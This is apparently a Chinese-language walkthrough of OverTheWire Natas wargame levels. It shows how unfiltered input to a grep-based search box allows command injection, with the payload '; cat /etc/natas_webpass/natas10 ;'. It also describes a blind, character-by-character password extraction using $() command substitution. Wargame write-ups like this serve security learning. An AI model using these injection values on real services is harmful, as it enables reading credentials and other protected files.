这是一个搜索框，查看源代码后发现服务器首先会检查url中needle(即待检索值)的值是否为空，如果不为空，则将其赋给变量key，再执行grep -i $key dictionary.txt，这儿没有任何的过滤且由先前已知没关的密码都存于”/etc/natas_webpass/“文件夹中，因而我们可构造待查询值为; cat /etc/natas_webpass/natas10 ;，此时服务器端查询语句则变为grep -i ; cat /etc/natas_webpass/natas10 ; dictionary.txt，即执行了三条命令，其中第二条命令会返回密码。

level 15 -> level 16

这一关算是natas10和上一关的结合加强版，首先其查询代码是 passthru("grep -i \"$key\" dictionary.txt")，相比较于natas，此处将输入的key用两个"封装了起来，所以在这里输入 .* /etc/natas_webpass/natas17是无效的，只是相当于在dictionary.txt中查询所输入的字符串，显然返回为空。既然如此，不妨输入一个字符’a’看看，发现返回了dictionary.txt中所有含有’a’字母的字符串，且大小写不敏感。我们在其中任意找一个相对较长的单词(避免其他单词中包含了这个单词，比如’Africa’就包含于’African’)，这里不妨就选择African，为了确保它不包含于其他单词，可再次回到初始界面输入’African’，发现只返回这一个值，于是确定选这个词不会出错。
在选出这个唯一的且不包含于其它单词的词后再来解释一下为什么要这么选，因为在bash中有一种手段叫命令替代(command substitution)，它相当于开启了一个subshell，即先将命令替代中的语句执行以后再将该语句的返回值返回到原语句，并结合原语句中的后续命令一同执行(具体用法可参考上面的文档链接)。有两种方式可执行命令替代：

  • 将命令用反引号” ` “进行封装
  • 将命令用 $() 进行封装

由于已知此关中反引号已经被过滤，于是我们选择用$()进行命令替换。类似上一关的思路，我们要做的就是每次查询一个字符，看它是否存在于natas17的密码中，如果存在，它将与之前选中的 “African” 来构成一个新字符并在”dictionary.txt”中进行查询，而由于African的唯一性即不包含于其他单词的性质，我们可以肯定此次查询的结果为空。于是简化中间步骤后就是，“每次查询一个字符，如果密码中有它，返回值为空”。
